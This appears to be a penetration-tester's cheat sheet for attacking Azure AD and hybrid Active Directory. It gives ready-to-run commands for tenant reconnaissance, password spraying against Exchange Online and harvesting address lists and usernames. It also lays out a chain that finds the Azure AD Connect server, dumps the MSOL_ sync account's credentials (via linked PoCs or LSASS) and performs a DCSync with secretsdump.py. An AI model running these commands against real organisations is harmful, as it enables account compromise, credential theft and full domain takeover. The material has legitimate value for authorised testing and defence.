### Overview

Active Directory  | Azure AD
------------------|---------
LDAP  | REST API'S
NTLM/Kerberos  | OAuth/SAML/OpenID
Structured directory (OU tree)  | Flat structure
GPO  | No GPO's
Super fine-tuned access controls  | Predefined roles
Domain/forest  | Tenant
Trusts  | Guests

### Unauthenticated

If managed in output, target is using Azure AD.

```
https://login.microsoftonline.com/getuserrealm.srf?login=username@domain.local&xml=1
```

Verify email addresses (does not leave any trace in Azure AD logs):

- https://github.com/LMGsec/o365creeper

Password spraying:

- `Security Defaults` or `Conditional Access Policies` features prevent such attacks
- Produce a lot of "Login Failure" logs in Azure AD and are easily recognizable 

```
Invoke-PasswordSprayEWS -ExchHostname outlook.office365.com -UserList emails.txt -Password 'Company2024!'
```

### Authenticated

o365recon uses the MSOnline PowerShell

```
PS C:\o365recon-master> Connect-MsolService
PS C:\o365recon-master> powershell -ep bypass .\o365recon.ps1 -outputfile output
```

`-users_detailed` ﬂag can be used in order to query more information about users. If the LastDirSyncTime is empty, the account only exists in the cloud.

List Azure AD roles and the members of these roles:

- https://gist.github.com/ciphertxt/2036e614edf4bf920796059017fbbc3d

Gather the list of all email addresses:

```
PS C:\> Get-GlobalAddressList -ExchHostname outlook.office365.com -UserName user@domain.onmicrosoft.c
om -Password Company2024 -OutFile global-address-list.txt
PS C:\> type .\global-address-list.txt
```

Connect to Exchange Service to retrieve the AD username corresponding to the given email:

```
PS C:\> Get-ADUsernameFromEWS -EmailList emails.txt -ExchHostname outlook.office365.com -Remote
```

List users with multi-factor authentication (requires Azure AD administrators):

```
PS C:\> Connect-MsolService
PS C:\> Get-MsolUser -EnabledFilter EnabledOnly -MaxResults 50000 | select DisplayName,UserPrincipalName,@
{N="MFA Status"; E={ if( $_.StrongAuthenticationRequirements.State -ne $null){ $_. StrongAuthenticationRequ
irements.State} else { "Disabled"}}} | export-csv mfaresults.csv
PS C:\> type .\mfaresults.csv
```

Best tool to exploit Azure AD:

- https://github.com/dirkjanm/ROADtools
- https://github.com/dirkjanm/ROADtools/wiki/Getting-started-with-ROADrecon


Exploiting password hash synchronization (phs):

`MSOL_` (the sync account) has replication privileges on the domain.

1) Find the server where Azure AD Connect is installed in description of the `MSOL_` user.

```
ldapsearch -H ldap://DC01.DOMAIN.COM:389 -D "DOMAIN\user" -w "password" -b "DC=DOMAIN,DC=COM" '(descriptio
n=*Azure*)' description
```

2) Dump the MSOL service account (which allows a DCSync) used by Azure AD Connect Sync. This requires local administrator account or ADSync service account.

- Blog: https://blog.xpnsec.com/azuread-connect-for-redteam/
- PoC: https://gist.github.com/xpn/f12b145dba16c2eebdd1c6829267b90c

If a fully deployed SQL Server is used instead of SQL Server Express database, the connection string from the PoC must be replaced by the following: `"Server=LocalHost;Database=ADSync;Trusted_Connection=True;"`

To dump the credentials over network:

- https://github.com/dirkjanm/adconnectdump

Or, by dumping LSASS 🚩.

3) DC Sync

```
python3 secretsdump.py DOMAIN/MSOL_xxxxxxx@DC01.domain.com
```

This account is also valid and highly-privileged in the cloud.
